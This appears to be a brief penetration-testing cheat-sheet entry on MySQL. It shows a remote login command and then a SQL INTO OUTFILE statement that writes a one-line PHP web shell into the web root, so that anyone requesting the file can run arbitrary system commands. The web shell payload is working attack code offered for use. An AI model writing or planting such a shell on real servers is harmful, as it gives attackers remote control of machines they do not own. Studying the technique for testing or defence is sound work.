### Basic MySQL usage
Connect to remote server:
```
mysql -h IP_ADDRESS -u USERNAME -p DATABASE_NAME        // -p means you are using a password, not that the following word is the password.
```

### Internal write to accessable file
With this command, we write a simple PHP RCE exploit into a file: 
```
select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
```
The `/tmp` directory will usually not work, so this exploit is rare.
